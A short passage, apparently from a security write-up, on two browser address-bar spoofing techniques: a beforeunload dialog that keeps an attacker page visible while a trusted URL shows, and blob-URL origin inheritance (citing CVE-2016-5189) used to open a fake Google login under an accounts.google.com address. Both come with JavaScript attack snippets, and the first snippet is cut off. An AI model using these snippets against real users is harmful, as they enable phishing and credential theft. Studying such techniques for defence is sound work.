Technique 3: beforeunload URL Freeze

Use beforeunload dialog to freeze the page transition. Address bar shows destination URL while attacker page is still visible (or vice versa). 

// When user clicks a link to google.com:
window.addEventListener('beforeunload', (e) => {
  e.preventDefault();
  e.returnValue = ''; // Shows dialog
  // During dialog: address bar shows accounts.google.com but attacker page still visible

Technique 4: Blob URL Inheritance (CVE-2016-5189)

Create blob: URL from the context of a trusted page. The blob: URL displays the origin it was created from in the address bar. 

// On google.com (via XSS), create a blob URL
const blob = new Blob(['<h1>Fake Google login</h1>'], {type: 'text/html'});
const blobURL = URL.createObjectURL(blob);
// blobURL = blob:https://accounts.google.com/uuid
window.open(blobURL);
// Address bar shows: blob:https://accounts.google.com/uuid
